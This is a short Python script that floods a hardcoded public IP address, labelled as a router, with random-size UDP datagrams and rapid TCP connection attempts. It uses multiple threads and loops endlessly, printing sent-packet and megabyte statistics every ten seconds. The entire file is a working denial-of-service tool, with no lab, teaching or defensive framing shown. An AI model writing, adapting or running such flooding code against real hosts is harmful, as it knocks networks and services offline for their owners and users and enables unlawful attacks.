import socket
import threading
import time
import random

router_ip = "62.109.121.43"

# Stats tracking
stats = {
    "udp_sent": 0,
    "syn_sent": 0,
    "udp_data": 0,
    "syn_data": 0,
    "udp_success": 0,
    "syn_success": 0,
    "udp_fail": 0,
    "syn_fail": 0
}
stats_lock = threading.Lock()

# UDP Attack
def udp_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.randbytes(random.randint(500, 1450))
            port = random.randint(1, 65535)
            
            sock.sendto(payload, (router_ip, port))
            data_sent = len(payload)
            
            with stats_lock:
                stats["udp_sent"] += 1
                stats["udp_data"] += data_sent
                stats["udp_success"] += 1
            sock.close()
            
        except:
            with stats_lock:
                stats["udp_fail"] += 1

# SYN Attack  
def syn_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            port = random.randint(1, 65535)
            
            result = sock.connect_ex((router_ip, port))
            with stats_lock:
                stats["syn_sent"] += 1
                stats["syn_data"] += 64  # Estimated SYN packet size
                if result == 0:
                    stats["syn_success"] += 1
                else:
                    stats["syn_fail"] += 1
            sock.close()
            
        except:
            with stats_lock:
                stats["syn_fail"] += 1

# Start 6 UDP threads
for _ in range(6):
    threading.Thread(target=udp_attack, daemon=True).start()

# Start 4 SYN threads
for _ in range(4):
    threading.Thread(target=syn_attack, daemon=True).start()

# Logging every 10s
last_time = time.time()
while True:
    time.sleep(0.1)
    current_time = time.time()
    
    if current_time - last_time >= 10:
        with stats_lock:
            total_sent = stats["udp_sent"] + stats["syn_sent"]
            total_data = stats["udp_data"] + stats["syn_data"]
            total_success = stats["udp_success"] + stats["syn_success"]
            total_fail = stats["udp_fail"] + stats["syn_fail"]
            
            # Convert bytes to MB
            data_mb = total_data / (1024 * 1024)
            
            print(f"2M50:{total_sent}:{data_mb:.2f}MB ---> ({total_success},{total_fail})")
            
            # Reset counters
            stats["udp_sent"] = 0
            stats["syn_sent"] = 0
            stats["udp_data"] = 0
            stats["syn_data"] = 0
            stats["udp_success"] = 0
            stats["syn_success"] = 0
            stats["udp_fail"] = 0
            stats["syn_fail"] = 0
            
        last_time = current_time
